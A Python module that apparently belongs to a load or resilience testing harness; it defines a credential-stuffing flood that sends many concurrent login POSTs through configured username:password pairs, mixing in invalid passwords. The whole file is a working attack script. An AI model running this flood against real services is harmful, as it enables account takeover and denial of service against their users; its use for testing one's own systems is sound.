#!/usr/bin/env python3
import threading
import time
import logging
import random
import requests

try:
    from urllib3.util.retry import Retry
except ImportError:
    Retry = None


class Attack:
    """Credential stuffing flood targeting the user/authentication service."""

    VECTOR_NAME = "credential_stuffing"
    TARGET_SERVICE = "user"
    RESOURCE_DIMENSIONS = ("cpu", "memory")

    def __init__(self, configuration, design_path, output_path, test_identifier):
        self.configuration = configuration
        self.output_path = output_path
        self.test_identifier = test_identifier
        self.base_url = (configuration.get("locust_host_url") or "").rstrip("/")
        self.login_path = configuration.get("attack_login_path") or "/login"
        raw_creds = configuration.get("attack_credentials") or "user@example.com:password"
        self.credentials = []
        for entry in raw_creds.split():
            if ":" in entry:
                self.credentials.append(tuple(entry.split(":", 1)))
        self.concurrency = int(float(configuration.get("attack_concurrency", 50)))
        self.timeout = float(configuration.get("attack_request_timeout_seconds", 5))
        invalid_ratio = configuration.get("attack_invalid_credential_ratio")
        try:
            invalid_ratio = float(invalid_ratio)
        except (TypeError, ValueError):
            invalid_ratio = 0.6
        self.invalid_ratio = min(1.0, max(0.0, invalid_ratio))
        delay_between_batches = configuration.get("attack_login_batch_delay_seconds")
        try:
            self.delay_between_batches = max(0.0, float(delay_between_batches))
        except (TypeError, ValueError):
            self.delay_between_batches = 0.0
        burst = configuration.get("attack_login_requests_per_credential")
        try:
            self.requests_per_credential = max(1, int(float(burst)))
        except (TypeError, ValueError):
            self.requests_per_credential = 5

    def worker(self, end_ts, stop_event):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        url = f"{self.base_url}{self.login_path}"
        while (time.time() < end_ts) and (not stop_event.is_set()):
            for username, password in self.credentials:
                if (time.time() >= end_ts) or stop_event.is_set():
                    break
                for _ in range(self.requests_per_credential):
                    if (time.time() >= end_ts) or stop_event.is_set():
                        break
                    try:
                        chosen_password = password
                        if self.invalid_ratio > 0 and random.random() < self.invalid_ratio:
                            chosen_password = f"{password}#invalid"
                        params = {"username": username, "password": chosen_password}
                        session.post(url, params=params, timeout=self.timeout)
                    except Exception:
                        pass
            if self.delay_between_batches > 0:
                stop_event.wait(timeout=self.delay_between_batches)

    def run(self, duration_seconds, stop_event):
        logging.info(
            "credential_abuse_flood: starting (target_service=%s, invalid_ratio=%.2f, concurrency=%d)",
            self.TARGET_SERVICE,
            self.invalid_ratio,
            self.concurrency,
        )
        end_ts = time.time() + duration_seconds
        threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
        for t in threads:
            t.start()
        for t in threads:
            remaining = max(0.0, end_ts - time.time())
            t.join(timeout=remaining)
        logging.info("credential_abuse_flood: finished")
